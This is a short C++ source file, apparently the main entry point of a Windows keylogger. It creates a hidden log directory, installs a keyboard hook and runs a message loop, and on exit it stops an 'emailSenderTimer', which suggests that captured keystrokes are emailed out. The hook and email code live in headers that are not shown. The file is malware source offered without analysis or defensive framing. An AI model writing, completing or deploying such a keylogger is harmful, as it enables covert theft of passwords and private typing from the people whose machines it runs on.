#include <Windows.h>
#include "IO.h"
#include "KeyHook.h"


int  APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	/*create directory where log file will reside*/
	IO::makeDir(IO::getDirectoryPath(true));
	/*init event listener*/
	installHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	/**/
	emailSenderTimer.stop();
	return 0;
}